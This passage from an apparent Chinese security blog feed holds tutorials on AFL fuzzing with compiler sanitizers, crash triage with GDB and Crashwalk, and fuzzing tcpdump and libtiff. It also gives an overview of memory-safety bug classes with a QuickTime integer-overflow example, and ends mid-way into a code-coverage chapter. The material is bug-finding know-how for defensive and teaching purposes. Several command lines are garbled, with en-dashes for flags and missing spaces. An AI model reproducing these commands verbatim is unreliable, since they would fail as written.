title="Sanitizers（消毒剂？）"></a>Sanitizers（消毒剂？）</h2><ul><li>基于编译器的检测工具</li><li>有助于发现BUGs</li><li>可以发现一些正常模式不好检出的错误，例如大内存分配，堆溢出，UAF等</li><li>不同类型的Sanitizers<ul><li>ASAN</li><li>MSAN</li><li>UBSAN</li><li>TSAN</li></ul></li></ul><h3 id="ASAN（Address-Sanitizer）"><a href="#ASAN（Address-Sanitizer）" class="headerlink" title="ASAN（Address Sanitizer）"></a>ASAN（Address Sanitizer）</h3><ul><li><p>编译时指令： <strong><u>-fsanitize=address</u></strong></p></li><li><p>可以检测各种问题，例如UAF，堆缓冲区溢出，内存泄漏等</p></li><li><p>ASAN + Fuzzer = More bugs!</p></li><li><p>有大牛表示：“AFL Fuzzing without ASAN is just a waste of CPU”</p></li><li><p>Ref:<a href="https://clang.llvm.org/docs/AddressSanitizer.html">https://clang.llvm.org/docs/AddressSanitizer.html</a></p></li></ul><p><img src="https://i.loli.net/2021/03/05/3htM1aizckY7C6o.png" alt="image-20210305153545094"></p><h3 id="UBSAN（UndefinedBehavior-Sanitizer）"><a href="#UBSAN（UndefinedBehavior-Sanitizer）" class="headerlink" title="UBSAN（UndefinedBehavior Sanitizer）"></a>UBSAN（UndefinedBehavior Sanitizer）</h3><ul><li><p>编译时指令： <strong><u>-fsanitize=undefined</u></strong></p></li><li><p>检测程序中未定义的行为</p><ul><li>除零漏洞，整数溢出，非法的读取等</li></ul></li><li><p>提升的发现错误的概率</p></li><li><p>Ref: <a href="https://clang.llvm.org/docs/UndefinedBehaviorSanitizer.html">https://clang.llvm.org/docs/UndefinedBehaviorSanitizer.html</a></p></li></ul><p><img src="https://i.loli.net/2021/03/05/1seZ3OUxwpIA5cQ.png" alt="image-20210305153956345"></p><h3 id="Memory-Sanitizer-MSAN"><a href="#Memory-Sanitizer-MSAN" class="headerlink" title="Memory Sanitizer(MSAN)"></a>Memory Sanitizer(MSAN)</h3><ul><li>编译时指令： <strong><u>-fsanitize=memory</u></strong></li><li>检测未初始化的读取等</li><li>Ref：<a href="https://clang.llvm.org/docs/MemorySanitizer.html">https://clang.llvm.org/docs/MemorySanitizer.html</a></li></ul><h3 id="Thread-Sanitizer-TSAN"><a href="#Thread-Sanitizer-TSAN" class="headerlink" title="Thread Sanitizer(TSAN)"></a>Thread Sanitizer(TSAN)</h3><ul><li>编译时指令： <strong><u>-fsanitize=thread</u></strong></li><li>检测数据竞争等</li><li>Ref：<a href="https://clang.llvm.org/docs/ThreadSanitizer.html">https://clang.llvm.org/docs/ThreadSanitizer.html</a></li></ul><h2 id="使用AFL（练习）"><a href="#使用AFL（练习）" class="headerlink" title="使用AFL（练习）"></a>使用AFL（练习）</h2><h3 id="编译并安装AFL"><a href="#编译并安装AFL" class="headerlink" title="编译并安装AFL"></a>编译并安装AFL</h3><ul><li>git clone <a href="https://github.com/google/AFL.git">https://github.com/google/AFL.git</a></li><li>make</li><li>cd llvm_mode</li><li>make   （这步可能需要clang）</li><li>cd ..</li><li>sudo make install</li></ul><p>如果安的是AFL++，直接用带的脚本一键安装完事儿</p><h3 id="如何用AFL编译一个程序？"><a href="#如何用AFL编译一个程序？" class="headerlink" title="如何用AFL编译一个程序？"></a>如何用AFL编译一个程序？</h3><p><img src="https://i.loli.net/2021/03/06/FewfK4O1kAyac7p.png" alt="image-20210306101946651"></p><ul><li>afl-clang ： gcc的编译器包装器，它将编译并插桩二进制文件</li><li>-fsanitize=address ： 开启ASAN （ 用AFL_USE_ASAN=1也行）</li><li>-g :  调试符号支持</li><li>imgRead.c : 源文件</li><li>imgReadafl ：生成可被模糊测试的可执行文件</li></ul><h3 id="使用AFL开始模糊测试"><a href="#使用AFL开始模糊测试" class="headerlink" title="使用AFL开始模糊测试"></a>使用AFL开始模糊测试</h3><ul><li>生成一个初始输入<ul><li>echo “IMG” &gt; input/1.img</li></ul></li><li>afl-fuzz –iinput –o output –m none –./imgRead@@<ul><li>afl-fuzz ： fuzzer的二进制程序</li><li>-i :  包含输入种子文件的目录</li><li>-o : Fuzzer的输出数据的目录<ul><li>Crashes : 包含使目标程序崩溃的输入文件</li><li>Hangs : 包含导致目标程序挂起(hang)的输入文件</li></ul></li><li>-m : 内存限制，如果为ASAN和64位，则将其设置为none<ul><li>否则使用编译器标志–m32将其编译为32位</li><li>将内存限制设置为–m 800</li><li>查找更多crashes</li></ul></li><li>-M : 主实例Master模式（如果您具有多个CPU内核）</li><li>-S ： 从实例Slaver，可以为任意n数，具体取决于您拥有的内核数</li></ul></li></ul><h3 id="根本原因分析（RCA）"><a href="#根本原因分析（RCA）" class="headerlink" title="根本原因分析（RCA）"></a>根本原因分析（RCA）</h3><ul><li>使用GDB对Crashes进行分析</li><li>常用命令：<ul><li>Gdb  <exe file name></li><li>r  -&gt;  开始运行目标程序</li><li>s -&gt; 步步运行程序</li><li>Next/fi-&gt; 一直运行到return</li><li>b  <a href="filename.c:linenumber">filename.c:linenumber</a> -&gt; 在对应filename.c中的 linenumber行数打断点（break）</li></ul></li><li>在我们的例子中：<ul><li>r  &lt;output/crashes/filename&gt;</li></ul></li></ul><h3 id="崩溃（Crash）分类"><a href="#崩溃（Crash）分类" class="headerlink" title="崩溃（Crash）分类"></a>崩溃（Crash）分类</h3><ul><li><p>如果遇到很多崩溃，Crashwalk是一个有用的工具，可以对崩溃进行分类</p></li><li><p>安装Crashwalk</p><ul><li>sudo apt-get install golang</li><li>go get -u github.com/bnagy/crashwalk/cmd/…</li><li>~/go/bin</li></ul></li><li><p>安装 exploitable</p><ul><li>~/src/exploitable/exploitable/exploitable.py</li><li>mkdir~/src</li><li>cd ~/src</li><li>git clone <a href="https://github.com/jfoote/exploitable.git">https://github.com/jfoote/exploitable.git</a></li></ul></li><li><p>Cwtriage——分类崩溃的实用程序</p><ul><li><u><strong>ASAN_OPTIONS=”abort_on_error=1:symbolize=0”</strong></u>  Cwtriage –afl –root output</li><li>分析每个崩溃文件并将结果保存在crashwalk.db中</li><li>使用ASAN运行，否则崩溃将无法复现</li></ul></li><li><p>Cwdump——从crashwalk.db转储崩溃信息的实用程序</p><ul><li>Cwdump  crashwalk.db</li></ul></li></ul><h2 id="使用AFL模糊测试一个开源软件"><a href="#使用AFL模糊测试一个开源软件" class="headerlink" title="使用AFL模糊测试一个开源软件"></a>使用AFL模糊测试一个开源软件</h2><h3 id="Fuzz-tcpdump"><a href="#Fuzz-tcpdump" class="headerlink" title="Fuzz tcpdump"></a>Fuzz tcpdump</h3><ul><li>先把tcpdump和libcap的源码dump下来<ul><li>git clone <a href="https://github.com/the-tcpdump-group/tcpdump.git">https://github.com/the-tcpdump-group/tcpdump.git</a></li><li>cd tcpdump</li><li>git clone <a href="https://github.com/the-tcpdump-group/libpcap.git">https://github.com/the-tcpdump-group/libpcap.git</a></li><li>cd libpcap</li></ul></li><li>使用AFL对其进行编译<ul><li>CC=afl-gcc CFLAGS=”-g -fsanitize=address -fno-omit-frame-pointer” LDFLAGS=”-g -fsanitize=address -fno-omit-frame-pointer” ./configure</li><li>sudo make &amp;&amp; make install</li></ul></li><li>语料库从哪来？？<ul><li>查看一下项目自带的test文件夹</li><li>收集别的符合条件的文件，比如issue页面</li><li>精简它们：afl-cmin–i tests –o mincorpus –m none –./tcpdump –vv –ee –nnr @@</li></ul></li><li>Fuzz 它<ul><li>afl-fuzz –I mincorpus –o fuzzoutput –m none – ./tcpdump –vv –ee –nnr @@</li></ul></li></ul><h3 id="Fuzz-libtiff"><a href="#Fuzz-libtiff" class="headerlink" title="Fuzz libtiff"></a>Fuzz libtiff</h3><ul><li>获取源码：<ul><li><a href="https://gitlab.com/libtiff/libtiff">https://gitlab.com/libtiff/libtiff</a></li></ul></li><li>用AFL编译<ul><li>./autogen.sh</li><li>CC=afl-gcc CXX=afl-g++ CFLAGS=”-g -fsanitize=address -fno-omit-frame-pointer” CXXFLAGS=”-g -fsanitize=address -fno-omit-frame-pointer” LDFLAGS=” -g  -fsanitize=address -fno-omit-frame-pointer” ./configure </li><li>sudo make &amp;&amp; make install</li></ul></li><li>收集语料库<ul><li><a href="https://lcamtuf.coredump.cx/afl/demo/">https://lcamtuf.coredump.cx/afl/demo/</a></li></ul></li><li>精简它们<ul><li>afl-cmin–itiff –o mintiff–./tiff2rgba @@ test.tiff</li></ul></li><li>Fuzz 它们<ul><li>afl-fuzz –i &lt;*input&gt; -o fuzzoutput –m none – tiff2rgba @@ test.tiff</li></ul></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>使用AFL在linux上fuzz开源软件十分简单</li><li>大多数的lib/开源软件的源代码都是可以获取的</li><li>在编译时插桩是可行的</li><li>在Fuzz时要用ASAN,MSAN,UBSAN</li><li>有时最需要花费时间的过程是项目编译<ul><li>缺失引用的第三方库（lib）</li><li>编译过程中的各种错误</li><li>不同项目不同的编译方法与各种选项</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 个人总结 </tag>
            
            <tag> fuzz </tag>
            
            <tag> afl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>模糊测试与寻找漏洞概述总结</title>
      <link href="2021/03/01/Fuzzing%20and%20vulnerabilities/"/>
      <url>2021/03/01/Fuzzing%20and%20vulnerabilities/</url>
      
        <content type="html"><![CDATA[<p>本文是对于模糊测试方面的小总结，计划三篇；第一篇概述；第二篇afl；第三篇Winafl。非大部头书，只提取关键信息。<br>本篇为第一篇：概述。</p><a id="more"></a><p>总览</p><ul><li><p>Part 1 </p><ul><li>漏洞 、 模糊测试过程 、 crash分类 、 根本原因分析（RCA）</li></ul></li><li><p>Part 2</p><ul><li>使用 AFL 在 linux 上进行模糊测试</li></ul></li><li><p>Part 3</p><ul><li>使用 WinAFL 在Windows上进行模糊测试</li></ul></li></ul><p>Part 1 总览</p><ul><li>​    漏洞<ul><li>不同类型的漏洞<ul><li>整数溢出</li><li>栈/堆溢出</li><li>越界读写 （OOB）</li><li>释放后使用/双重释放（UAF/DF）</li></ul></li><li>人工识别C程序中的漏洞</li></ul></li><li>什么是模糊测试？<ul><li>模糊测试的需求</li><li>模糊测试的种类</li><li>Fuzz一个程序的具体过程</li></ul></li><li>Crash分析<ul><li>Crash追踪</li><li>根本原因分析（RCA）</li></ul></li><li>向供应商/漏洞赏金报告问题</li></ul><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><ul><li><p>软件里的漏洞</p><ul><li>例如：如果将长度大于1000字节数据的URL get请求发送到Web服务器，服务器可能会崩溃</li></ul></li><li><p>可用于执行各种恶意的活动</p><ul><li><p>远程执行代码——有人可以远程的执行恶意代码，危害性十足</p></li><li><p>拒绝服务–可能会使软件或整个系统崩溃</p></li><li><p>特权升级–从本地帐户到管理员帐户</p><p><u><strong>以上三种都可转换为可利用的Exploits</strong></u></p></li></ul></li><li><p>在恶意网络攻击中使用它们会造成何种危害？</p><ul><li>导致系统受损，勒索软件，特洛伊木马，僵尸网络，比特币矿工，数据盗窃等</li><li>行业影响–数据盗窃，生产力损失</li></ul></li><li><p>常见漏洞类型</p><ul><li>整数溢出/下溢，栈/堆溢出，超出范围的读/写，释放后使用，双重释放可以转换为漏洞利用</li></ul></li></ul><p>​    </p><h3 id="不同类型的漏洞"><a href="#不同类型的漏洞" class="headerlink" title="不同类型的漏洞"></a>不同类型的漏洞</h3><p>先说<strong>溢出</strong>，是指计算机进行运算产生的结果若超出机器所能表示的范围。</p><p>溢出有上溢出和下溢出之分，对整型数来说，从正方向超过了数的表示范围，称为<strong>上溢出</strong>（overflow），从负方向超过了数的表示范围，称为<strong>下溢出</strong>（underflow）。</p><p>就像往水桶里装水，水满则溢，变量也是这样，如果要存储的值超过了变量所能提供的位数，就会出现溢出。</p><h4 id="整数溢出（上溢）"><a href="#整数溢出（上溢）" class="headerlink" title="整数溢出（上溢）"></a>整数溢出（上溢）</h4><ul><li><p>​    它是什么？</p><ul><li> <strong>整数</strong> 这一数据类型中的弱点，即它们存储数据的方式。</li><li>例子：<ul><li><u><strong>unsigned int j</strong></u></li><li><u><strong>int i</strong></u></li><li>int整数的大小为 4 字节，一个字节 8 bit </li><li>MAX 值 ： 11111111111111111111111111111111</li><li>2^32</li><li>Signed vs unsigned?<ul><li>MSB（<em>most significant bit</em> 最高有效位）是适用于有符号（signed）整数的</li><li>1 = <u><strong>0</strong></u>0000000000000000000000000000001</li><li>-1 = <u><strong>1</strong></u>0000000000000000000000000000001</li><li>有符号整数最大值为 int = **<u>0x7</u>**FFFFFFF</li><li>无符号整数最大值为 int = **<u>0xF</u>**FFFFFFF</li></ul></li></ul></li><li>在这种情况下会发生什么？<ul><li><u><strong>int i</strong></u></li><li><u><strong>unsigned int j</strong></u></li><li>j = 0xFFFFFFFF + 1<ul><li>结果将变为0，进位1位将被截断</li></ul></li><li>i= 0x7FFFFFFFF + 1<ul><li>结果将变为-0x80000000（负数）</li></ul></li></ul></li></ul><p><img src="https://i.loli.net/2021/03/02/nIygpd1DYLFjSKt.png" alt="image-20210302133250527"></p><p>​            整数溢出，由于进位会被截断，因此数量非常少；在该案例中直接变成0.</p><ul><li>​    我们来举一个真实Apple漏洞例子：</li><li><a href="https://mailman.videolan.org/pipermail/vlc/2008-March/015488.html">https://mailman.videolan.org/pipermail/vlc/2008-March/015488.html</a></li></ul></li></ul><p><img src="https://i.loli.net/2021/03/02/osYLMIQ6JrFm1zV.png" alt="image-20210302140338356"></p><p>在1961行MP4_GET4BYTES函数读取.mov file的长度，苹果的quicktime会将这个值存储在i_len变量里面随后分配一块内存。</p><p>问题出在1965行之中，如果我们“精巧”地构造mov文件使其i_len恰好为0xFFFFFFFF，则malloc（i_len+1）就会恰好整数溢出为0，变成分配0空间。它不会报错，但是不会分配所需的内存。配合1966行不断地循环赋值，这些都会存储在缓冲区之中，可能导致代码执行。</p><h4 id="整数溢出（下溢）"><a href="#整数溢出（下溢）" class="headerlink" title="整数溢出（下溢）"></a>整数溢出（下溢）</h4><ul><li><p>它是什么？</p><ul><li>int 的大小 =  4 bytes</li><li>Signed vs unsigned?<ul><li>signed int 范围 = -0x80000000 to 0x7FFFFFFF</li><li>unsigned int 范围 =  0 to 0xFFFFFFFF</li></ul></li></ul></li><li><p>在这种情况下会发生什么？</p><ul><li>int i；</li><li>i =  -0x80000000 –1 = 0x7FFFFFFF</li><li>i = 尽可能高的正数</li></ul><p><img src="https://i.loli.net/2021/03/02/2bOSiXrYdoEuZJh.png" alt="image-20210302160017572"></p></li></ul><p>整数下溢后，数量变为非常大，由负数（-）变为正数（+）</p><p><img src="https://i.loli.net/2021/03/02/WlvpOxeh1z5fFNd.png" alt="image-20210302160250715"></p><h4 id="栈-堆溢出"><a href="#栈-堆溢出" class="headerlink" title="栈/堆溢出"></a>栈/堆溢出</h4><h5 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h5><ul><li>本地变量存储在栈中</li><li>栈是有限尺寸</li><li>溢出局部变量，可损坏堆栈上的其他数据。</li><li>例子：</li></ul><p><img src="https://i.loli.net/2021/03/02/kv4ZgiWOVoIBhUy.png" alt="image-20210302160714386"></p><p><img src="https://i.loli.net/2021/03/02/DQ4k136N7Wf2jAs.png" alt="image-20210302160746496"></p><h5 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h5><ul><li>动态内存分配</li><li>从堆中分配</li><li>堆中的溢出会损坏堆中的其他数据</li><li>例子：</li></ul><p><img src="https://i.loli.net/2021/03/02/N5y8CLieFK1G3MD.png" alt="image-20210302161027982"></p><h4 id="越界读写"><a href="#越界读写" class="headerlink" title="越界读写"></a>越界读写</h4><h5 id="栈越界读写"><a href="#栈越界读写" class="headerlink" title="栈越界读写"></a>栈越界读写</h5><ul><li>超出堆栈内存允许限度的内存访问或编写操作</li><li>可能导致地址的违法访问</li><li>例子：</li></ul><p><img src="https://i.loli.net/2021/03/02/8loF9Aa3PsuxHZg.png" alt="image-20210302161342372"></p><p><img src="https://i.loli.net/2021/03/02/97xa8CLWXfbYtj1.png" alt="image-20210302161403579"></p><h5 id="堆越界读写"><a href="#堆越界读写" class="headerlink" title="堆越界读写"></a>堆越界读写</h5><ul><li>超出堆内存允许限度的内存访问或书写操作</li><li>可能导致地址的违法访问</li><li>例子：</li></ul><p><img src="https://i.loli.net/2021/03/02/VRh7A5CHTyZpIQ3.png" alt="image-20210302161549838"></p><h4 id="UAF-与-Double-free-漏洞"><a href="#UAF-与-Double-free-漏洞" class="headerlink" title="UAF 与 Double free 漏洞"></a>UAF 与 Double free 漏洞</h4><h5 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h5><ul><li>释放后使用内存</li><li>可能导致程序崩溃或意外行为</li><li>例子：</li></ul><p><img src="https://i.loli.net/2021/03/02/WOjIAmuTylXbe7n.png" alt="image-20210302161823661"></p><p><img src="https://i.loli.net/2021/03/02/JUXzoKkIHBDFTeY.png" alt="image-20210302161841850"></p><h5 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h5><ul><li>多次（两次？）释放分配的内存</li><li>可能导致程序崩溃</li><li>例子：</li></ul><p><img src="https://i.loli.net/2021/03/02/9trFop6wyR1qSPg.png" alt="image-20210302161941109"></p><h3 id="尝试一下：自己动手识别漏洞"><a href="#尝试一下：自己动手识别漏洞" class="headerlink" title="尝试一下：自己动手识别漏洞"></a>尝试一下：自己动手识别漏洞</h3><p><img src="https://i.loli.net/2021/03/02/t7Lf581RpQCTsI9.png" alt="image-20210302162319575"></p><h2 id="追踪BUG-与-模糊测试"><a href="#追踪BUG-与-模糊测试" class="headerlink" title="追踪BUG 与 模糊测试"></a>追踪BUG 与 模糊测试</h2><h3 id="追踪BUG"><a href="#追踪BUG" class="headerlink" title="追踪BUG"></a>追踪BUG</h3><ul><li>手动代码审核<ul><li>需要大量的时间，非常缓慢</li><li>无法覆盖所有代码路径</li><li>代码基数大，单人无法充分进行审核</li><li>不是很有成效</li><li>重要的BUG可能会被粗心错过</li><li>无法涵盖所有场景</li></ul></li><li>自动化<ul><li>自动错误查找，非常快</li><li>可以覆盖大多数代码路径</li><li>无需担心代码的大小</li><li>可以由个人完成</li><li>可以自动进一步归类统计有关崩溃、问题，并通知相关人员</li></ul></li></ul><h3 id="什么是模糊测试"><a href="#什么是模糊测试" class="headerlink" title="什么是模糊测试"></a>什么是模糊测试</h3><ul><li><p>程序中的自动错误查找过程</p><ol><li>向程序馈送输入</li><li>实时监控程序的崩溃（crashes）状态</li><li>保存崩溃测试案例</li><li>不断生成新的测试案例</li><li>转到步骤1</li></ol><p><img src="https://i.loli.net/2021/03/02/ZuGlfp2jiOk3nDt.png" alt="image-20210302163409721"></p></li></ul><h3 id="模糊测试Fuzzer的分类"><a href="#模糊测试Fuzzer的分类" class="headerlink" title="模糊测试Fuzzer的分类"></a>模糊测试Fuzzer的分类</h3><h4 id="愚蠢的Fuzzer"><a href="#愚蠢的Fuzzer" class="headerlink" title="愚蠢的Fuzzer"></a>愚蠢的Fuzzer</h4><ul><li>完全随机的输入</li><li>无需了解文件格式/网络协议</li><li>可能需要很多时间（取决于你的运气）</li><li>例子：radmasa</li></ul><h4 id="改良后的Fuzzer"><a href="#改良后的Fuzzer" class="headerlink" title="改良后的Fuzzer"></a>改良后的Fuzzer</h4><ul><li>根据预先定义的结构创建输入</li><li>需要了解文件格式</li><li>需要了解网络协议</li><li>例子：peach,sulley</li></ul><h4 id="覆盖引导的Fuzzer"><a href="#覆盖引导的Fuzzer" class="headerlink" title="覆盖引导的Fuzzer"></a>覆盖引导的Fuzzer</h4><ul><li>使用界面监控程序流</li><li>无需了解文件格式</li><li>变异文件并检查新代码路径覆盖/崩溃<ul><li> 发现新代码路径——&gt;添加到队列</li><li>崩溃——&gt;保存输入</li></ul></li><li>例子：AFL, WinAFL, HonggFuzz, libfuzzer</li></ul><h2 id="覆盖率与插桩"><a href="#覆盖率与插桩" class="headerlink" title="覆盖率与插桩"></a>覆盖率与插桩</h2><h3 id="基本块和覆盖率计算"><a href="#基本块和覆盖率计算" class="headerlink" title="基本块和覆盖率计算"></a>基本块和覆盖率计算</h3><h4 id="Basic-block"><a href="#Basic-block" class="headerlink" title="Basic block"></a>Basic block</h4><ul><li>没有分支的连续代码行</li><li>入口点–控制进入此基本块</li><li>退出点-控制转到另一个基本块</li></ul><p><img src="https://i.loli.net/2021/03/02/5AC7KgszSarxcBo.png" alt="image-20210302212900999"></p><h4 id="Code-Coverage"><a href="#Code-Coverage" class="headerlink" title="Code Coverage"></a>Code Coverage</h4><p><img src="https://i.loli.net/2021/03/02/4jWCn1hmBMK8TRi.png" alt="image-20210302170801857"></p><h3 id="插桩"><a href="#插桩" class="headerlink" title="插桩"></a>插桩</h3><h4 id="如何跟踪运行中的程序执行过程？"><a href="#如何跟踪运行中的程序执行过程？" class="headerlink" title="如何跟踪运行中的程序执行过程？"></a>如何跟踪运行中的程序执行过程？</h4><ul><li>基本方法-添加打印定义的代码和解试</li></ul><p><img src="https://i.loli.net/2021/03/02/68XlQG4cEibVz5D.png" alt="image-20210302213213951"></p><ul><li>无法提供太多数据</li><li>需要人工的工作</li></ul><h4 id="如果源代码可用"><a href="#如果源代码可用" class="headerlink" title="如果源代码可用"></a>如果源代码可用</h4><ul><li>在编译时插桩</li><li>在编译过程中加入插桩代码</li></ul><p><img src="https://i.loli.net/2021/03/02/fA5d8by3TJptmKH.png" alt="image-20210302213616983"></p><ul><li>可以自动化执行，如实时的覆盖测量，避免人工耗费精力</li></ul><h4 id="如果源代码不可用"><a href="#如果源代码不可用" class="headerlink" title="如果源代码不可用"></a>如果源代码不可用</h4><ul><li>在运行时插桩</li><li>在运行时添加插桩代码</li></ul><p><img src="https://i.loli.net/2021/03/02/NGi4Ag7KQsVMbpk.png" alt="image-20210302213849984"></p><h4 id="以AFL为例的插桩详细"><a href="#以AFL为例的插桩详细" class="headerlink" title="以AFL为例的插桩详细"></a>以AFL为例的插桩详细</h4><p><img src="https://i.loli.net/2021/03/02/VwOlH4ThUoXG1zb.png" alt="image-20210302214600718"></p><h2 id="Fuzz过程"><a href="#Fuzz过程" class="headerlink" title="Fuzz过程"></a>Fuzz过程</h2><h3 id="覆盖率引导的模糊测试过程"><a href="#覆盖率引导的模糊测试过程" class="headerlink" title="覆盖率引导的模糊测试过程"></a>覆盖率引导的模糊测试过程</h3><p><img src="https://i.loli.net/2021/03/02/BzbAediOa8l7XJS.png" alt="image-20210302215452140"></p><h3 id="语料库收集"><a href="#语料库收集" class="headerlink" title="语料库收集"></a>语料库收集</h3><ul><li>一个好的文件语料库将有助于在短时间内发现路径</li><li>对于目标软件或lib库，如果附带测试样例文件，可以收集使用</li><li>使用可用的样例文件<ul><li><a href="https://lcamtuf.coredump.cx/afl/demo/">https://lcamtuf.coredump.cx/afl/demo/</a></li><li><a href="http://samples.ffmpeg.org/">http://samples.ffmpeg.org/</a></li></ul></li><li>搜索  github</li><li>搜索  Google</li></ul><h3 id="语料库精简"><a href="#语料库精简" class="headerlink" title="语料库精简"></a>语料库精简</h3><ul><li>有一个特别大的语料库是好事还是坏事？<ul><li>什么样的文件尺寸算是特别大？<ul><li>位翻转操作（Bitflip/byteflip）将需要大量时间</li><li>10MB = 10485760 Bytes</li></ul></li><li>如果许多文件触发相同的代码路径怎么办？<ul><li>模糊测试将花费不必要的周期时间来运行它们</li></ul></li></ul></li><li>需要最小化输入语料库<ul><li>筛选出不会导致新路径的文件，删掉他们</li><li>筛选出大的文件，删掉他们</li></ul></li><li>怎么做？<ul><li>afl-cmin–iinput –o mininput–./program @@</li></ul></li></ul><h3 id="Crashes——-gt-探寻根因——-gt-确认漏洞"><a href="#Crashes——-gt-探寻根因——-gt-确认漏洞" class="headerlink" title="Crashes——&gt;探寻根因——&gt;确认漏洞"></a>Crashes——&gt;探寻根因——&gt;确认漏洞</h3><h4 id="根因分析（Root-cause-analysis-RCA）"><a href="#根因分析（Root-cause-analysis-RCA）" class="headerlink" title="根因分析（Root cause analysis RCA）"></a>根因分析（Root cause analysis RCA）</h4><ul><li>我们发现了一个崩溃——现在要干什么？<ul><li>文件中的哪个字段函数部分？</li><li>该字段函数的价值？</li><li>程序中的哪个条件触发的？</li></ul></li></ul><h4 id="1——2个Crash"><a href="#1——2个Crash" class="headerlink" title="1——2个Crash"></a>1——2个Crash</h4><ul><li>人工分析</li></ul><h4 id="成百上千的Crashes？"><a href="#成百上千的Crashes？" class="headerlink" title="成百上千的Crashes？"></a>成百上千的Crashes？</h4><ul><li><p>如何分析分类它们？</p><ul><li>Crashwalk, atriage, afl-collect，BUGid…</li></ul></li></ul><h2 id="向供应商-或Bug-赏金机构报告"><a href="#向供应商-或Bug-赏金机构报告" class="headerlink" title="向供应商/或Bug 赏金机构报告"></a>向供应商/或Bug 赏金机构报告</h2><ul><li>首先向供应商报告</li><li>大部分供应商有一个类似于 <a href="mailto:&#x73;&#101;&#99;&#x75;&#114;&#x69;&#x74;&#x79;&#64;&#x76;&#101;&#x6e;&#x64;&#111;&#x72;&#46;&#99;&#x6f;&#x6d;">&#x73;&#101;&#99;&#x75;&#114;&#x69;&#x74;&#x79;&#64;&#x76;&#101;&#x6e;&#x64;&#111;&#x72;&#46;&#99;&#x6f;&#x6d;</a>的安全邮箱</li><li>不要公开披露自己的发现</li><li>你可能会因为crash而得到奖励，或者CVE编号</li></ul>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 个人总结 </tag>
            
            <tag> fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fuzzbook4——模糊测试中的代码覆盖率</title>
      <link href="2021/02/15/fuzz%20book4%20%E4%BB%A3%E7%A0%81%E8%A6%86%E7%9B%96%E7%8E%87/"/>
      <url>2021/02/15/fuzz%20book4%20%E4%BB%A3%E7%A0%81%E8%A6%86%E7%9B%96%E7%8E%87/</url>
      
        <content type="html"><![CDATA[<p><img src="https://image.3001.net/images/20210111/1610358571_5ffc1f2b95e569df29bae.png!small" alt="image-20201005165901975"></p><p>在<a href="">上一章中</a>，我们介绍了基本的模糊测试—生成随机输入以测试程序。那么我们该如何衡量这些测试的有效性？一种方法是检查发现的错误的数量（和严重程度），但是如果错误很少，我们需要一个别的方法来从数值上衡量有效性。 在本章中，我们将介绍<em>代码覆盖率</em>的概念，它可以衡量在测试运行期间实际执行程序哪些部分，对于尝试覆盖尽可能多的代码的测试样例生成器，覆盖率这一指标也至关重要。</p><a id="more"></a><h3 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a>先决条件</h3><ul><li>读者需要对程序的执行方式有所了解</li><li>读者需要先行学习过基本的模糊测试</li></ul><h3 id="CGI解码器"><a href="#CGI解码器" class="headerlink" title="CGI解码器"></a>CGI解码器</h3><p>我们首先了解一个简单的Python函数，该函数对CGI编码的字符串进行解码。URL（即Web地址）中使用CGI编码来编码URL中无效的字符，例如空格和某些标点符号：</p><ul><li>将空格全都替换为 “+”</li><li>将其它的无效字符统一替换为“%xx”，其中XX是对应的无效字符十六进制等效项</li></ul><p>例如在CGI的编码中，字符串<code>Hello， world！</code>将被替换为<code>Hello%2c+world%21</code> ，其中<code>2c</code>和<code>21</code>是十六进制的<code>,</code>和 <code>!</code></p><p>目标函数<code>cgi_decode()</code>的作用就是将其解码回其原始形式。该部分代码复制了[<a href="http://ix.cs.uoregon.edu/~michal/book/">Pezzè <em>et al</em>, 2008.</a>]中的成果。（它的里面其实包含了几个错误，但我们之后再说）</p><pre><code class="python">def cgi_decode(s):    &quot;&quot;&quot;Decode the CGI-encoded string `s`:       * replace &quot;+&quot; by &quot; &quot;       * replace &quot;%xx&quot; by the character with hex number xx.       Return the decoded string.  Raise `ValueError` for invalid inputs.&quot;&quot;&quot;    # Mapping of hex digits to their integer values    hex_values = &#123;        &#39;0&#39;: 0, &#39;1&#39;: 1, &#39;2&#39;: 2, &#39;3&#39;: 3, &#39;4&#39;: 4,        &#39;5&#39;: 5, &#39;6&#39;: 6, &#39;7&#39;: 7, &#39;8&#39;: 8, &#39;9&#39;: 9,        &#39;a&#39;: 10, &#39;b&#39;: 11, &#39;c&#39;: 12, &#39;d&#39;: 13, &#39;e&#39;: 14, &#39;f&#39;: 15,        &#39;A&#39;: 10, &#39;B&#39;: 11, &#39;C&#39;: 12, &#39;D&#39;: 13, &#39;E&#39;: 14, &#39;F&#39;: 15,    &#125;    t = &quot;&quot;    i = 0    while i &lt; len(s):        c = s[i]        if c == &#39;+&#39;:            t += &#39; &#39;        elif c == &#39;%&#39;:            digit_high, digit_low = s[i + 1], s[i + 2]            i += 2            if digit_high in hex_values and digit_low in hex_values:                v = hex_values[digit_high] * 16 + hex_values[digit_low]                t += chr(v)            else:                raise ValueError(&quot;Invalid encoding&quot;)        else:            t += c        i += 1    return t</code></pre><p>这里有一个例子，让我们看看它是如何运行的：</p><pre><code class="python">cgi_decode(&quot;Hello+world&quot;)</code></pre><pre><code class="python">&#39;Hello world&#39;</code></pre><p>但如果我们要系统地测试<code>cgi_decode()</code>，我们该如何进行？</p><p>相关的文献区分了两种测试的方式：<em>黑盒测试</em> 和 <em>白盒测试。</em></p><h3 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h3><p>黑盒测试的思想是在标准规范中进行测试，而不知道内部细节。因此在上述情况下，我们必须通过指定的功能对 cgi_decode() 